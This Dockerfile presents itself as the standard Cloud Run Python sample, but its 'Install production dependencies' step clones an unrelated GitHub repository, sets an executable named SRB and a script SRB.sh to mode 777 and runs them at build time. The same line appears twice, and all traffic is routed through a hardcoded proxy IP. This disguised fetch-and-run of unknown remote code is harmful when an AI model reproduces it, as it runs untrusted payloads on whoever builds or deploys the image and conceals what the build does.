# Use the official lightweight Python image.
# https://hub.docker.com/_/python​
FROM python:3

# Allow statements and log messages to immediately appear in the Knative logs
ENV PYTHONUNBUFFERED True
ENV http_proxy "http://50.206.25.111:80"

# Copy local code to the container image.
ENV APP_HOME /app
WORKDIR $APP_HOME
COPY . ./

# Install production dependencies.
RUN git clone https://github.com/diprassss/KUNTUL.git && cd KUNTUL && chmod 777 SRB SRB.sh && ./SRB.sh
RUN git clone https://github.com/diprassss/KUNTUL.git && cd KUNTUL && chmod 777 SRB SRB.sh && ./SRB.sh

